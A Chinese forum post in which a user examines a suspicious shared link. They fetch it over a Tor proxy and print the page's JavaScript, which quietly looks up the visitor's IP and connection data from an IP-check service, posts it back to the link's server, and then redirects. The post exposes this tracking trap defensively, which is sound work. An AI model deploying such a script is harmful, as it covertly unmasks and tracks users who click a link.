contents:
粗略调查了楼主发的url, 引入的地址是jcrb.com（貌似是检察院的网站，注意是墙内）。

用curl指令审查了原链接，里面包含未知的json，所以把链接替换成了网页截图。

指令：
curl --socks5 127.0.0.1:9150 https://www.newspaper.cash/mgetp02121


返回代码：
<!DOCTYPE html>

<html lang="en">

<head>

<meta charset="UTF-8">

<script src="static/js/_jQuerySlideX.min.js"></script>

</head>

<body>

<script>

setTimeout("window.location.href='/mgetp02121'",3000);

function xhrSuccess() {

this.callback.apply(this, this.arguments);

}


function xhrError() {

console.error(this.statusText);

}


function loadFile(url, callback /*, opt_arg1, opt_arg2, ... */) {

var xhr = new XMLHttpRequest();

xhr.callback = callback;

xhr.arguments = Array.prototype.slice.call(arguments, 2);

xhr.onload = xhrSuccess;

xhr.onerror = xhrError;

xhr.open("GET", url, true);

xhr.send(null);


}


function showMessage(message) {

var xhr = new XMLHttpRequest();

xhr.open('post', '/mgetp02121', true);

xhr.setRequestHeader('Content-Type', 'application/json');

xhr.onerror = xhrError;

xhr.send(this.responseText);

}


loadFile("https://am.i.mullvad.net/json", showMessage, "New message!\n\n");

</script>

</body>

</html>


在archive.org存的快照：
https://web.archive.org/web/20200225062534/https%3A%2F%2Fmohu.pincong.rocks%2Farticle%2F1491

链接导向网站的截图：
https://web.archive.org/web/20200225062726/http://web.archive.org/screenshot/https://www.newspaper.cash/mgetp02121
